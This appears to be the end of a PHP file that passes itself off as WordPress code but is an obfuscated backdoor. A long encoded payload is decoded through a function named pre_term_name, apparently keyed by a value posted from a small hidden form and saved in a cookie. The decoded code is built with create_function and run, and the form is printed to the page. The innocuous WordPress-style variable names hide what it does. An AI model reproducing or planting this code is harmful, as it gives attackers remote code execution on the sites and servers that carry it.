VLbyHZhtwLPcXMEA5CEwA4tpZNWaK6NtFZ1XOoGULVfNQ++whqNjuPArjJBvM%LiykRXwVXo2tawhecdc6jT5WnaAYH471U9Gk6VbaBG4+d8HBAlZnB3o+wmoc5NreJV5Erh48khMALtTJ8jOeGvvPTcDEVJD9vnz5BsZZ+9S9eXCIMbPSXOIUSvsImgOsoZXPK0XamJJHs462MsDGlb7keIww3t59aM9b8vRKeMlWTnxxsPSiSdq644drV5v+qZUiNHl4aPqrBYs5ihCM%IY1aEduAmLJFmlufr3%qQasmOQEyezcC4Fyxznet4UIAjTSHKGKLKQodsnBI6OOy+hvjaotuUGgL842Z9%agLBRVsC1jA1ROaamfAAI5gQQ%3CzHYuYSmQt9VYdq0gf3I5oGQm04C9dgy0pluBqNrul3rt0fp8s2PJovfyvhylwPfo47N+YH%qjm9IwEt8ckcnvppeW+OQ95+8St7QbtnUNGRas3fdNZAQrfuGnvL85IszN6qx0XdJ3QSP7gaFFL9ylMIJd+m01QB8RH%r+%XZP48ukrV93RGVNyUXfmWFhyMM5dRvcU%nP%oHtcep0UdM8Eq1NqFfCpTTOK2y+rphjxH7U9bQB21r8ZBGPcuW2SXYUDLgq8RG4VxpmtlVLrHJquyD9mVgXM3zabh4NbCHnRqMOdje00usEPQT6mA6WtjRKvXxMuQMzz%WKnNeAvSYeN7UbxnWhp5PibzuxB8e1QrzTCDPY34M1EMdpekryQDPeKfHrzyBNxPpQKeYcHwO5tptf3sNkyZqCRIdNoWYJzgojeJj+Fx5rsFwaqI2BcsTSJStHuZ3vSnu4oOvtPpuOP613cpN2EnwvdAYycJahzA9lyNdx2i5qvoiBoDkiom4MP4IOTNS3Lx00BB3tvtvMsL40Om0ZDj5VO5bFoAdAU8SNqTXXQTCciP0tvoBp8qy89fXWE0kTkQLiNR+E12mekp4LNMTf6hr5uMtoZ2rZookGzpEyWo0VF9gEx7VROsghKqmr7S9ateLFPlutdaFUIlkm%EfKJn7xe7leqLALhkH0HvzVwyZgRLikFjnzWdItGarMEqssezsBIkS8jHpsed89IQkTp2W%Ip6bxESitOstZe6x0YbXUCy1xKpIVAmepj90Fyr99n0WBsHoCM7X%h71dCvoHqGNaR4BRpzNO26fteMXfTfJRfAMhu6ZgNgRFoQ8ddsZRNtF8Sh+lwRLwFtDh+pzUNDFB2hPw+f8JQLnnUhe5PfG7w31hZMghj2yamO0RINa27WW9znvTU7+9UPs2t8Rg4A9qx8e5JQUYSy970J9ZAf0XKmHXyWeRS5HNW2b6V9FLokmCTspBqsB9BsyvqHi+wbF3ShUWrY56md95eJVHZd9YEkcsG0vFR9vbVxHIZbKZjG11YSh2ofga9nJb2GPi1Gof1LfOhFHGGh7Nb+oMi2AHOZVnJjvwAWMW07xEKJtneHLEwYtKVcP6v7%jTM6qTDnzgpMWvf3MRcq%nBvUQr3z1VLHpvkiulICBtGOu3k7Va27T2A1yvrni5TQAqXdxJ09dGM8+c+idvYxdEfLdV+ie6gl4tbD+qybguOqCLu%LkTO4NxMI%7MFuw049tl25I8Fl6vVqSwVNQSPxbX6BcCLgrdBR3FPySpBScaiHN5q0CdEPFKhRJX47GRU4bIFuk6y+u5+fqwYjyXoNzzFypXUSe+ESfYqYNzKzl2Rl5OzA4wGFweYM6TTjXQP4Fd67S8Mr5aZ8vNS9wB0Yb6J9Cs25h7S3c4W6zrkQWvVKC40KmLd%1V2nyQMfizf%smigMxht6cksy5UjbDPMhw9+qaDqyAoqBybsl+5kKsZuzG9hclf8ijkwKSjMQqwlzjl7uYrtQG8ZIu1oGK33ljyGYU7+vDgUxwDaWsh8VTGpVC+qfW0yIGMrSCMuIVs3Mmou22GuidgAZjYOXn4XovBq9wEqW2rZilrWsLBNO+L5qJOZmmv3qy4ddHWZWDEFICRS3CqJlkYNraViqx6NhJVl5TnhVXSt6HCZ%EmjlrEEDmH+2sR0x9li6Kv0jonZIgY1xwMMU0YKKcqa4l8vAcoUWzKiG4lSBqVzjaNq7rl1FIA++jQBslg3b2PlXSo1gx%Wvm3%qMK7vpMssKvSs8P1yWfnRgxFX41J%pZIBaJH5XFReX59CTSQ44uWLGEjy6jWhxEOxWUvt9xNNQ9okFiYvmmEiAaB768zApXKmABe8v1OEIjjsu1uB6EFHHzdJ3ACgRQqXocdhCBqifv2HIZRnPYW07tsvWF85+Y0FuB%QeVl%UfiGuh9fu55%mmu%b9sz3kRQX619EXbpCppG0MMXOlN64t1sETpzViVdKmNwzC4PW0L1a5wtgKA4vMnnXIdeRMlHVKYucUhkdWsHCt4QCR%s%Rd%hmiWP0L%Sixu%JELOPpJc7lWq1m1kwOyowik8XHUy681G3urC+FwIXTKG2OrsKtYrH4SSBfJ%WsQP9O0Um20DiO5cTGUS2a0x+cybJbxWzPnQ6i+8+j2ghY+hCMYds5EjGKoJToL1OmaF%9VP7S8smG2K5RjTZq8Zge4DppHo8YR378MySSOjiO6OsuJtNirArPOfph2EbZcbcw7b4+0GxIa9BwxHLQuPbpxV9IdFzX9wafKISDJ1H4iuxyjers6HIXPnxUU6%xFk1h3zWO%AwNI%Z0y9eOxQgVsInJM7TjsVCkMajncFj9a7Rr0MTAZb93b0xb9H+BdQzDGpf7wi+zp5f4GYCcNEDXK9X91kvWku2Dw5AkzapSe%SWXN0iz%y%+R9%Un3kdoBLMVhteNwCfcas2YISqV+D65kneSFlV3w8Vp6RXgnPrWPqeKlqFHEOo1LYcoCqrA5JQOCOS0CwA+cJC2s0T52%x38hCo18uPiHMhfVzbo6phzxIzum5byMI%kcfA+bk7ENzsn2M+nAgcmML%hnE+opdwipky8gtjEYyqw62+Y6rgwhTVgOZkEbQ+Ypf2FeRa2DrExLyMcJZcpYy79tFnq8yGtShEI0XSMkrGmP9Ma4HgbBUCWKk0ny2QVIIFyjoiqComM%5Gp%%BWnvDhb5bquIey0yKtrBKWMysw8A1UeDnbKexqpS9npJLCHfELziLiT8IcO1EuxoqSJigtIfWzhwi%3cs2+QESM+%wHc3uly0vvWGsDdNTpuTPKM3e2Ll0A5ganR8cMmYduEWzz8x5PIR%tlnGvAzec0lIbG%f9rzfWFCqJRtXnCN5CSLgLFdbeQ3HVb3RSOC%tmTKkcweNYzth0UKxivaqpTNoktcuZOL%CSmKU1ZPrqCT5CcSMCz7A8DgsVSF0eilF7ehgGJs58AU+iY9NVlBOd%1i%rrfl8Bf9A%8AS2KKwQXOlj0Nx8eYnR3xb7wRTFETAZRvyqRfIN170fTUWxH+3kgA2Fi2QPMpCsrshgR%PM8A5AwwyQrvtGZBczb%FiUuI4WvMGVAWFwEkzlK44XPtmmF1Ec1NTOSdqkWk5mNW7pS4FXhwpxHbhmT4gN2bY6lOYDJd+EMKg57+R8MwIPKInE2E5J9XiUhZ0hSIx8ddT+AzbM1oHbfOfmKW%wx392KXdFFjbpT7iNasA7%7FRoI9CarHscUcH0YR%euwpzb7JBWIbKjT1FIZvpp8b9u+uEZ2fXxnJzFOZIjzDEAX3ZkHBpoGUGiBgZArTbqiinKjVycziW8gshNUzs%2Ea1bVyt83oTYgyFMw50rKyVlmQydOZSGujz0qZfNYjrqkRHq3het5dSXAUVVNJSn7+XDu9Yr9I72cgKuTUTbYA6Gb%B641ockvGum2ko1Xrik0HAOIXEAHgF6a%dSXHlVL31UfHHgUZXDj%qGRxP87XazDdESmjUMTqfsK78ql53loD2qer0%QU2gJTRTdp%oG9yYzj%+Zqq8xmjCsBtCsu9oj93xy5rWzDq+A08TY1ka%it3A2RCeEFjgxkYlSkFCM+z2Vi5fJ3DIqhqqTE6RTK4qhx++waNV28xY2VGLJRazhd4TxnXOL2G8c2WKjs+k2cVjysZE4yklHvTOHkPRA4pDrTn0IAZSlgL%45tBOCJ58KGhCX+cIlAlfVCNl2XdNGj1aHfBdU5rXwPwp62Ifaa+Uorv+PWcEup44HbQUcKoUgcIwi2Hb1zc2e6LRYWjR5sXcAk8f73FeXQzPYKMv6LTMq1lQoE2WgREOGdp%wUsohqf%Azbl7ysIneHumvcqFQojLNi6ARokvgfsnCR21q2%ak2ZhDv6BTa4qfgaIVYE3VjvmEvO%bOOFz0HNipcLn82zwrqZU8LRyZ7sf6khuEDlqoAdJTWMAPxBMZg8oF+BjEFb2BSMGgq6ZFkKRS%C558yB6oFcczzzJMrrHdvuxhT7w8xp%qrx4bgP2bknLYVTe%u7EwAE0SKvKDYa64kKr3gIioQChowa408lqoFKVJB9oOWSDxdfPfnt7+YT4yxXUZGTOjFIKDb43vS2PRcZFT6cJrO7Bfp7PeLAaxXrqvlEFL2ai8Yc4LZUOjcWRNfcvtZtqL0crEs1dczA4DgCXczW4tb%TCEwd85ZNBI%nqDT+D4ofHZzJuV5XkDZo84pfNfv85BQ3CbOFJj5heYCAT59w%trKXfnjEHyBSbMyRMFTtsZW6BVHc6ngN97ug56Z0VxLouZDyQggQnMS0GjPcVF3xbOu4WimW0w1Kw7k78ACxZInboBRStaP0sK3Hhh2%QFQxxwT3Q0+E2VHeowJMK5S1wlTULXG9Uh5LFZEquwtwdBk2v39vzEjlXsFtrRVR+tS+MqfVRfk+bJ+05UfEXmtS14JlI23gQu7CQQ8guBgta5E6GdacvujltxgAdUFD3LRQ+PBZwUZslQdKDSyC3Af3J1I+orjoOsB9rwiP0F7gQxe4kzRBLgriR23CCBT2vzT8QfjeGiiWracKTi%jAqbSvH%ayvWhWeNtfIiuZQEq7wQTyPzSF6tBqumLnl%9jAXi3fAzMuaZN8EoSfuAypaDDeWoAgqVl+vRaKzwyrOM0yQUwSFU2CzJT6YnzVUjPC2A3IEBrTqonL15GFcGR07vSSgKKpmB9TxKrwPaaFEafTGgJ55U2fQ0g63SqmtZP83V1ZDfp5fth6ZWOlEb+fVOC7db9nzGAKyrteK7kFZ7Tx3%UD3EGHC2xkS%onJC7e3ODMUED9H+u2JbRAjRJErYEdgvT2xBAuCdEur%gmbLrnikWan3ahrnb7MhySNFVeqbKoFrntCA2xvcyXtr3DSvlAzBJbfUdy20doP9j9ZIq8XCVY8tJX4611V33qOKPCg56HpFACf2pH+%w7s7RDpftsTpKywIplsuuSoWI6a7o0jar%qhwveIS52Q1F%UZKO1vKTyMb8FPZRz56q4bgcTbLStMxbHz7Q7EmJaXeQVr41o62sn64qelk1%jFgO2UWpco6NA3HcHF1wEAdy+hNCnPlQ86czbeRRJd+H9H5GlwMZvNQeCrA4TZA6AqANo1q9h%6PsNm+KW11zpK9+Ai65E8LbLTVkXDmP38T8Eujdgu8EVlqhQqBOa4gvDN7C';
$wp_auth_check = '<form method="post" action=""> <input type="input" name= "_f_wp" value=""/><input type="submit"value="&gt;"/> </form>';

$wpautop = pre_term_name( $wp_kses_data, $wp_nonce );

if( isset( $wpautop ) ){
	if( isset($_POST['_f_wp']) ) @setcookie( '_f_wp', $_POST['_f_wp'] );
	$shortcode_unautop = create_function( '', $wpautop );
	unset( $_f_wp, $wpautop );
	$shortcode_unautop();
}

echo $wp_auth_check;

?>